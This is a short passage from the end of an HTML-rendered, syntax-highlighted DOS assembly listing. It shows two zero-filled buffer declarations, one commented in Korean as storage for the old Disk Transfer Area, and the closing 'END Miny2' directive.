            </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">80h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
 </span><span class="sc5">OldDTA</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">80h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">           </span><span class="sc1">; 옛 DTA 내용 저장</span><span class="sc0">
            </span><span class="sc9">END</span><span class="sc0">   </span><span class="sc5">Miny2</span><span class="sc0">

</span></div></body>
</html>
